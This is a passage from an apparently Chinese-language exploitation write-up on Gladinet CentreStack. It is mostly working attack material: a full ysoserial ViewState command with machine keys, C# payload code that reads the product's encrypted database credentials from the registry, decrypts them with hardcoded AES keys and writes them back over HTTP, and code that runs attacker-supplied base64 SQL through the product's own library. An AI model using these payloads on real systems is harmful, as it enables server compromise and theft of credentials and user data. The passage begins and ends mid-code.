class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Security.Cryptography;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><span class="hljs-keyword">using</span> Microsoft.Win32;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">E</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> Random3 = <span class="hljs-string">&quot;不过，调查也显示，日本、约旦、以色列和黎巴嫩等国的受调查者大多认为美国仍将保持自己的超级大国地位。近三分之二的埃及人认为中国『永远也不会』取代美国成为唯一的超级大国。在美国人中，有57％的受调查者认为美国不会把地位输给中国，不过也有三分之一的美国人认为，中国最终将超过美国，更有7％的人认为中国已经超过美国了。西欧国家的受调查者则比去年更加认为，中国永远也不会超过美国成为世界领袖。例如，44％的西班牙人和43％的法国人认为美国将保持自己的『一超』地位，比去年的比例都增加了9个百分点。不过，在接受调查的4个西欧国家中，大多数人都认为中国已经取代美国或者必将超过美国成为世界领袖。另外，墨西哥人的17％、阿根廷人的16％和印度人的15％也都认为，中国已经取代美国，成为世界头号超级大国了。&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> Random4 = <span class="hljs-string">&quot;moDriveは、ドライブとしてマウントできるので、フォルダコピー感覚で使えて超快適だが、無料だと容量が1Gバイトでちょっと手狭だ。「Gladinet」を利用してみよう。複数のウェブストレージを、ZumoDriveと同様、フォルダみたいに使えるようにするソフトse Software Gladinet ermöglicht es euch via Laufwerksbuchstabe zum Beispiel au&quot;</span>;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">byte</span>[] bs3 = Encoding.UTF8.GetBytes(Random3);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">byte</span>[] bs4 = Encoding.UTF8.GetBytes(Random4);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Aes aesProvider;<br><br><br>    <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">Encode</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> s</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> String.IsNullOrEmpty(s)<br>            ? String.Empty<br>            : HttpUtility.HtmlEncode(s);<br>    &#125;<br><br><br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>()</span><br>    &#123;<br>        HttpContext ctx = HttpContext.Current;<br>        ctx.Server.ClearError();<br>        ctx.Response.Clear();<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-built_in">string</span> DBConn = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBConn&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBServer = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBServer&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBUser = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBUser&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBUserPassword = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBUserPassword&quot;</span>);<br>            <span class="hljs-built_in">string</span> DBName = ReadEncryptedConnFromRegistry(<span class="hljs-string">&quot;DBName&quot;</span>);<br><br><br>            StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>            sb.Append(<span class="hljs-string">&quot;&lt;DBConn&gt;&quot;</span>);<br>            sb.Append(Encode(Decrypt(DBConn, <span class="hljs-number">32</span>)));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBConn&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBServer&gt;&quot;</span>);<br>            sb.Append(Encode(DBServer));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBServer&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBUser&gt;&quot;</span>);<br>            sb.Append(Encode(DBUser));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBUser&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBUserPassword&gt;&quot;</span>);<br>            sb.Append(Encode(Decrypt(DBUserPassword, <span class="hljs-number">32</span>)));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBUserPassword&gt;&quot;</span>);<br><br><br>            sb.Append(<span class="hljs-string">&quot;&lt;DBName&gt;&quot;</span>);<br>            sb.Append(Encode(DBName));<br>            sb.Append(<span class="hljs-string">&quot;&lt;/DBName&gt;&quot;</span>);<br><br><br>            ctx.Response.ContentType = <span class="hljs-string">&quot;text/plain; charset=utf-8&quot;</span>;<br>            ctx.Response.Write(sb.ToString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            ctx.Response.Write(<span class="hljs-string">&quot;Error: &quot;</span> + HttpUtility.HtmlEncode(ex.Message));<br>        &#125;<br>        <span class="hljs-keyword">finally</span><br>        &#123;<br>            ctx.Response.Flush();<br>            ctx.Response.End();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">ReadEncryptedConnFromRegistry</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> valueName</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span> subKeyPath = <span class="hljs-string">@&quot;SOFTWARE\Gladinet\Enterprise&quot;</span>;<br><br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            RegistryView view = Environment.Is64BitProcess<br>                ? RegistryView.Registry64<br>                : RegistryView.Registry32;<br><br><br>            <span class="hljs-keyword">using</span> (RegistryKey hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, view))<br>            <span class="hljs-keyword">using</span> (RegistryKey key = hklm.OpenSubKey(subKeyPath))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br><br><br>                <span class="hljs-built_in">object</span> val = key.GetValue(valueName);<br>                <span class="hljs-keyword">if</span> (val == <span class="hljs-literal">null</span>)<br>                    <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br><br><br>                <span class="hljs-keyword">return</span> val.ToString();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> Aes <span class="hljs-title">GetAES</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> n</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (aesProvider != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> aesProvider;<br><br><br>        Aes aes = Aes.Create();<br>        aes.KeySize = <span class="hljs-number">256</span>;<br>        aes.Key = GetBytes(bs3, n);<br>        aes.IV = GetBytes(bs4, n / <span class="hljs-number">2</span>);<br>        aesProvider = aes;<br>        <span class="hljs-keyword">return</span> aes;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">GetBytes</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] src, <span class="hljs-built_in">int</span> count</span>)</span><br>    &#123;<br>        <span class="hljs-built_in">byte</span>[] dst = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[count];<br>        Array.Copy(src, dst, count);<br>        <span class="hljs-keyword">return</span> dst;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-built_in">string</span> <span class="hljs-title">Decrypt</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> cipherText, <span class="hljs-built_in">int</span> n</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(cipherText))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;<br><br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            Aes aes = GetAES(n);<br>            <span class="hljs-built_in">byte</span>[] cipherBytes = Convert.FromBase64String(cipherText);<br>            <span class="hljs-keyword">using</span> (MemoryStream ms = <span class="hljs-keyword">new</span> MemoryStream(cipherBytes))<br>            <span class="hljs-keyword">using</span> (CryptoStream crypto = <span class="hljs-keyword">new</span> CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Read))<br>            <span class="hljs-keyword">using</span> (StreamReader reader = <span class="hljs-keyword">new</span> StreamReader(crypto, Encoding.UTF8))<br>            &#123;<br>                <span class="hljs-keyword">return</span> reader.ReadToEnd();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> cipherText;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成 Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile --decryptionkey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --validationkey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --generator=3FE2630A -c &quot;CentreStack.GetConn.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../images/image18.png" alt="图片"></p><p>其密码为 win-i3ba3ebkbaf ，其实就是主机名。</p><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>连接数据库后对其中的表进行简单分析，发现有用户邮箱、文件名称和对应路径、LDAP 配置等信息，还是很有用的。我们可以直接利用 CentreStack 本身的数据库操作 DLL 实现信息的获取。</p><p>现在来寻找数据库操作的 dll ，这里看到了一个 AddUserPage.aspx： </p><p><img src="https://uploader.shimo.im/f/DAcDnnzOmFEtVK8q.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="/../../images/image20.png" alt="图片"></p><p><img src="https://uploader.shimo.im/f/lK3SbhGuAa9IqSaM.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="/../../images/image22.png" alt="图片"><br>userlib.dll user.GladUserMgr</p><p><img src="/../../images/image23.png" alt="图片"><br>继续跟进 CreateUserEx 方法，最终跟进到 GladUserDB 类。</p><p><img src="/../../images/image24.png" alt="图片"></p><p><img src="https://uploader.shimo.im/f/OObCZlf9PwfH4Yam.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3NDkzNTIzNDksImZpbGVHVUlEIjoiTkprYm5LMExlbmZsMmFrUiIsImlhdCI6MTc0OTM1MjA0OSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwicGFhIjoiYWxsOmFsbDoiLCJ1c2VySWQiOjcyNzgzNDMyfQ.4jEgP8tD9ZKvqhy1fmI7FZLppbzPv_FVBp9ytjiB-Ys" alt="img"><br><img src="/../../images/image26.png" alt="图片"><br>主要关注 GetRegConnString() 和  Config.ConnectionString 可以和上面获取数据库信息的逻辑对上：</p><p>GetRegConnString 主要是直接获取注册表中的 DBConn 字段：</p><p><img src="/../../images/image27.png" alt="图片"><br>Config.ConnectionString 则是获取单独的字段随后构造连接字符串：</p><p><img src="/../../images/image28.png" alt="图片"><br>随后连接字符串给传入 GetDBByConnString，根据其特征分别是 3 种不同的数据库：sql server、postgres、mysql</p><p><img src="/../../images/image29.png" alt="图片"><br>到这里我们就知道该如何去直接调用这个 dll 去执行 sql 了。</p><p>代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Collections;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Reflection;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><span class="hljs-keyword">using</span> System.Data;<br><span class="hljs-keyword">using</span> System.Data.Common;<br><span class="hljs-keyword">using</span> System.Runtime.Serialization;<br><span class="hljs-keyword">using</span> System.Runtime.Serialization.Formatters.Binary;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">E</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">SerializeToJson</span>(<span class="hljs-params">DataTable data</span>)</span><br>    &#123;<br>        StringBuilder json = <span class="hljs-keyword">new</span> StringBuilder();<br>        json.Append(<span class="hljs-string">&quot;&#123;\&quot;success\&quot;:true,\&quot;columns\&quot;:[&quot;</span>);<br><br><br>        <span class="hljs-comment">// 序列化列信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; data.Columns.Count; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) json.Append(<span class="hljs-string">&quot;,&quot;</span>);<br>            json.Append(<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;&quot;</span> + EscapeJsonString(data.Columns[i].ColumnName) + <span class="hljs-string">&quot;\&quot;,\&quot;type\&quot;:\&quot;&quot;</span> + EscapeJsonString(data.Columns[i].DataType.Name) + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>);<br>        &#125;<br><br><br>        json.Append(<span class="hljs-string">&quot;],\&quot;rows\&quot;:[&quot;</span>);<br><br><br>        <span class="hljs-comment">// 序列化行数据</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; data.Rows.Count; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) json.Append(<span class="hljs-string">&quot;,&quot;</span>);<br>            json.Append(<span class="hljs-string">&quot;&#123;&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; data.Columns.Count; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (j &gt; <span class="hljs-number">0</span>) json.Append(<span class="hljs-string">&quot;,&quot;</span>);<br>                <span class="hljs-built_in">string</span> <span class="hljs-keyword">value</span> = data.Rows[i][j] != <span class="hljs-literal">null</span> ? data.Rows[i][j].ToString() : <span class="hljs-string">&quot;null&quot;</span>;<br>                json.Append(<span class="hljs-string">&quot;\&quot;&quot;</span> + EscapeJsonString(data.Columns[j].ColumnName) + <span class="hljs-string">&quot;\&quot;:\&quot;&quot;</span> + EscapeJsonString(<span class="hljs-keyword">value</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span>);<br>            &#125;<br>            json.Append(<span class="hljs-string">&quot;&#125;&quot;</span>);<br>        &#125;<br><br><br>        json.Append(<span class="hljs-string">&quot;]&#125;&quot;</span>);<br>        <span class="hljs-keyword">return</span> json.ToString();<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">EscapeJsonString</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> input</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;null&quot;</span>;<br>        <br>        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">char</span> c <span class="hljs-keyword">in</span> input)<br>        &#123;<br>            <span class="hljs-keyword">switch</span> (c)<br>            &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\\&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\\\&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\&quot;&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\\&quot;&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\b&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\f&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\f&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\n&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\r&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\t&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-literal">default</span>:<br>                    <span class="hljs-keyword">if</span> (c &lt; <span class="hljs-string">&#x27; &#x27;</span>)<br>                    &#123;<br>                        sb.AppendFormat(<span class="hljs-string">&quot;\\u&#123;0:X4&#125;&quot;</span>, (<span class="hljs-built_in">int</span>)c);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        sb.Append(c);<br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.ToString();<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">GetData</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-comment">// 加载 userlib.dll</span><br>            <span class="hljs-built_in">string</span> dllPath = <span class="hljs-string">@&quot;C:\Program Files (x86)\Gladinet Cloud Enterprise\portal\bin\userlib.dll&quot;</span>;<br>            Assembly assembly = Assembly.LoadFile(dllPath);<br>            <br>            <span class="hljs-comment">// 获取 GladUserDB 类</span><br>            Type gladUserDBType = assembly.GetType(<span class="hljs-string">&quot;user.GladUserDB&quot;</span>);<br>            <span class="hljs-keyword">if</span> (gladUserDBType == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find GladUserDB type\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// 初始化数据库连接</span><br>            MethodInfo isDBReadyMethod = gladUserDBType.GetMethod(<span class="hljs-string">&quot;IsDBReady&quot;</span>);<br>            <span class="hljs-keyword">if</span> (isDBReadyMethod == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find IsDBReady method\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-built_in">bool</span> isReady = (<span class="hljs-built_in">bool</span>)isDBReadyMethod.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">if</span> (!isReady)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Database is not ready\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// 获取并解码 Base64 格式的 SQL 查询</span><br>            <span class="hljs-built_in">string</span> base64Sql = HttpContext.Current.Request.Form[<span class="hljs-string">&quot;s&quot;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(base64Sql))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;No SQL query provided\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-built_in">string</span> sqlQuery;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-built_in">byte</span>[] sqlBytes = Convert.FromBase64String(base64Sql);<br>                sqlQuery = Encoding.UTF8.GetString(sqlBytes);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (FormatException)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Invalid Base64 SQL query format\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// 创建数据库命令</span><br>            MethodInfo createDBCmdMethod = gladUserDBType.GetMethod(<span class="hljs-string">&quot;CreateDBCmd&quot;</span>, <span class="hljs-keyword">new</span> Type[] &#123; <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>) &#125;);<br>            <span class="hljs-keyword">if</span> (createDBCmdMethod == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find CreateDBCmd method\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            DbCommand cmd = (DbCommand)createDBCmdMethod.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[] &#123; sqlQuery &#125;);<br><br><br>            <span class="hljs-comment">// 获取数据</span><br>            MethodInfo getDataMethod = gladUserDBType.GetMethod(<span class="hljs-string">&quot;GetData&quot;</span>, <span class="hljs-keyword">new</span> Type[] &#123; <span class="hljs-keyword">typeof</span>(DbCommand) &#125;);<br>            <span class="hljs-keyword">if</span> (getDataMethod == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find GetData method\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            DataTable data = (DataTable)getDataMethod.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span 